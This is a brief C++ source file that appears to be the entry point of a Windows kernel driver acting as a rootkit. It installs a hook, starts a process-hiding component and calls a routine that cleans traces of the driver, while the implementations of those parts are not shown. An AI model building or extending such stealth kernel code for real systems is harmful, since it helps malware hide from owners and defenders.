#include "driver.h"
#include "hook.h"
#include "cleaner.h"
#include "process_hider.h"

static NTSTATUS RealEntry(PDRIVER_OBJECT DriverObject)
{
    InitPoolTag();

    if (!Hook::Install(&Hook::Handler)) {
        return STATUS_UNSUCCESSFUL;
    }

    InitializeProcessHider();
    CleanAllTraces(DriverObject);

    return STATUS_SUCCESS;
}

extern "C" NTSTATUS DriverEntry(
    PDRIVER_OBJECT  DriverObject,
    PUNICODE_STRING RegistryPath)
{
    UNREFERENCED_PARAMETER(RegistryPath);
    return RealEntry(DriverObject);
}